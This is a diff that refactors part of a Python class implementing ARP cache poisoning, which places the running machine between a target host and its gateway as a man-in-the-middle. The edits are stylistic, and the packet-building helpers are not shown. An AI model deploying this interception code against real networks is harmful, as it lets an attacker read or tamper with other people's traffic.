@@ -61,16 +61,10 @@ class ARPPoisonService:
         :param interval: how often to run arp poison
         """
         self.target_ip = target_ip
-        if target_mac is None:
-            self.target_mac = ARPPoisonService.get_mac(self.target_ip, mac_resolve_max_tries)
-        else:
-            self.target_mac = target_mac
+        self.target_mac = target_mac or type(self).get_mac(self.target_ip, mac_resolve_max_tries)
 
         self.gateway_ip = gateway_ip
-        if gateway_mac is None:
-            self.gateway_mac = ARPPoisonService.get_mac(self.gateway_ip, mac_resolve_max_tries)
-        else:
-            self.gateway_mac = gateway_mac
+        self.gateway_mac = gateway_mac or ARPPoisonService.get_mac(self.gateway_ip, mac_resolve_max_tries)
 
         self.interval = interval
         self._should_spoof = False
@@ -81,16 +75,16 @@ class ARPPoisonService:
         inserts this machine between target_ip and gateway_ip
         """
         while self._should_spoof:
-            ARPPoisonService._poison_arp_cache(self.target_ip, self.target_mac, self.gateway_ip)
-            ARPPoisonService._poison_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip)
+            type(self)._poison_arp_cache(self.target_ip, self.target_mac, self.gateway_ip)
+            type(self)._poison_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip)
             sleep(self.interval)
 
     def _restore_normal_arp(self):
         """
         resets ip/mac mapping so that gateway ip resolves to gateway mac, and target ip resolves to target mac
         """
-        ARPPoisonService._reset_arp_cache(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
-        ARPPoisonService._reset_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
+        type(self)._reset_arp_cache(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
+        type(self)._reset_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
 
     def start_mitm(self):
         logger.info("starting spoof")
